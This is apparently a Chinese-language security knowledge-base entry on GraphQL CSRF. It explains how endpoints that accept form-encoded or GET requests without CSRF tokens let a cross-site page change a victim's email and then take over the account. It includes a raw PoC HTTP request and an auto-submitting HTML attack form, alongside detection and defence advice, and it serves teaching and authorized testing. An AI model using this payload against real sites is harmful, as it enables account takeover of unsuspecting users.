---
id: web-generic-graphql-csrf-form-encoded-mutation
title: GraphQL CSRF：端点接受 x-www-form-urlencoded/GET 且无 CSRF Token，跨站自动提交表单以受害者身份执行 changeEmail mutation
type: scenario
domain: web
path: web/generic/graphql
technique: graphql-csrf-form-encoded-mutation
tags:
- graphql
- csrf
- mutation
- content-type
- form-encoded
- session
- api
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V540
  verified_at: '2026-11-11T19:09:54+08:00'
  notes: '已对照 content.md 与 img43-48 核对：changeEmail(JSON) 正常执行，改为 Content-Type: application/x-www-form-urlencoded 并以 query/operationName/variables 三字段提交后仍返回新邮箱，Burp 生成自动提交 CSRF PoC；响应 Set-Cookie 为 SameSite=None。未验证点：未在浏览器实际诱导受害者。'
url: /docs/web/generic/graphql/web-generic-graphql-csrf-form-encoded-mutation/
draft: false
kb_aliases:
- GraphQL CSRF
- GraphQL changeEmail CSRF
- x-www-form-urlencoded GraphQL
- GraphQL 跨站请求伪造
- GraphQL mutation CSRF
---

## 一句话结论

GraphQL 端点通常假设客户端只发 `application/json`，因而省略 CSRF Token；如果服务端同时接受 `application/x-www-form-urlencoded` 的 POST（或 GET 查询参数），浏览器就能以“简单请求”跨站自动提交表单，携带受害者会话执行 `changeEmail` 等敏感 mutation，把受害者邮箱改成攻击者地址，进而通过密码重置接管账号。

## 原理

- 跨站自动提交的 HTML 表单只能产生 `application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain` 三种 Content-Type，属于 CORS “简单请求”，不触发预检；`application/json` 无法由普通表单构造，跨站需要预检，因此 JSON-only 的 GraphQL 端点天然较难 CSRF。
- 部分 GraphQL 服务器/中间件为了兼容，会解析表单编码的 `query`、`operationName`、`variables` 参数，或允许 GET `?query=`；此时请求形态与普通表单一致，CSRF 防护（若有）必须依赖 Token/Origin/Referer 校验。
- 如果会话 Cookie 在跨站请求中会被携带（`SameSite=None` 或浏览器默认策略允许），且服务端不校验 CSRF Token、不校验 Origin，恶意页面即可让受害者浏览器提交 GraphQL mutation。
- 之所以成立：安全假设落在“客户端只能发 JSON”上，而服务端实际接受更多内容类型/方法；浏览器对简单请求不做来源拦截，两者叠加产生 CSRF。

## 触发条件

- GraphQL 端点接受 `application/x-www-form-urlencoded` 的 POST，或接受 GET `?query=`（甚至允许 GET 执行 mutation）。
- 端点没有 CSRF Token 校验，也没有严格的 Origin/Referer 校验。
- 会话 Cookie 能在跨站请求中发送（`SameSite=None`；或目标浏览器/旧策略允许）。
- 存在有实际影响且无需二次确认的 mutation（改邮箱、改密码、绑定账号、转账等）。

## 利用步骤

1. 抓取正常 mutation 请求（如 `changeEmail`），确认其为 GraphQL 调用与所需参数。
2. 在 Burp 中把请求改为 `Content-Type: application/x-www-form-urlencoded`，body 写成 `query=...&operationName=changeEmail&variables={"input":{"email":"attacker@example.com"}}`（URL 编码），重放确认服务端接受。
3. 或尝试 GET `/graphql?query=...&variables=...`，确认 GET 是否同样执行。
4. 用 Burp Engagement tools → Generate CSRF PoC 生成自动提交表单，或手写 HTML；诱导已登录受害者访问。
5. 验证邮箱已被修改；如需证明账号接管，走“改邮箱 → 触发密码重置邮件 → 重置密码”流程（授权测试中只操作自己的测试账号）。

## PoC

表单编码的 mutation 请求：

```http
POST /graphql HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: session=<受害者会话>

query=%0A%20%20%20%20mutation%20changeEmail(%24input%3A%20ChangeEmailInput!)%20%7B%0A%20%20%20%20%20%20%20%20changeEmail(input%3A%20%24input)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20email%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22attacker%40example.com%22%7D%7D
```

跨站自动提交页面：

```html
<html><body>
<form action="https://target/graphql" method="POST">
  <input type="hidden" name="query" value="mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }"/>
  <input type="hidden" name="operationName" value="changeEmail"/>
  <input type="hidden" name="variables" value='{"input":{"email":"attacker@example.com"}}'/>
  <input type="submit" value="Submit request"/>
</form>
<script>document.forms[0].submit();</script>
</body></html>
```

原文环境结果：改为表单编码后服务端正常执行 `changeEmail` 并返回新邮箱，Burp 生成的 CSRF PoC 表单可复现该变更。

## 变体与关联

- 变体：GET 形式的 `?query=` 同样是简单请求；若 GET 允许执行 mutation（不少实现未限制），CSRF 甚至不需要表单 body。
- 变体：`text/plain` 表单可发送近似 JSON 的 body，若服务端宽松解析 JSON 也可 CSRF（见 [[web-generic-csrf-json-text-plain-form-enctype]]）。
- 关联：[[web-generic-csrf-missing-token-state-changing-endpoint]]（通用“状态变更接口无 CSRF Token”）；[[web-generic-graphql-mutation-missing-function-authz]]（GET 执行 mutation 同时也是函数级鉴权问题的入口）。
- 边界：强制 `application/json` 且拒绝其他 Content-Type、校验 CSRF Token/Origin、Cookie 设置 `SameSite=Lax/Strict` 时，该链路不成立。

## 检测与防御

- 检测：GraphQL 端点上出现表单编码或 GET 形式的 mutation 请求；`Content-Type` 与正常客户端不一致；跨站来源（Origin/Referer 为空或外域）的 mutation 请求；短时间邮箱/密码变更。
- 防御：只接受 `Content-Type: application/json`，拒绝表单编码与其他类型；GET 仅允许 query 且禁止 mutation；为状态变更请求加 CSRF Token 或要求自定义头（如 `X-Requested-With`，并校验）。
- 防御：会话 Cookie 设置 `SameSite=Lax` 或 `Strict`；校验 Origin/Referer；敏感变更（改邮箱/密码）增加二次验证并向用户告警。
